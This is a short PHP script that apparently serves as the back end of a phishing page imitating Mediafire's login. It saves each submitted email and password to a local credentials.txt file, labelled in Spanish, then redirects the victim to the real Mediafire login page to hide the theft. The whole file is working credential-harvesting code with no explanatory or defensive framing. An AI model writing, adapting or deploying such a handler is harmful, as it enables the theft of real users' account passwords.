<?php

file_put_contents("credentials.txt", "[+] Mediafire -> Usuario: " . $_POST['login_email'] . " Contraseña: " . $_POST['login_pass'] . "\n", FILE_APPEND);
header('Location: https://www.mediafire.com/login/');
exit();
?>
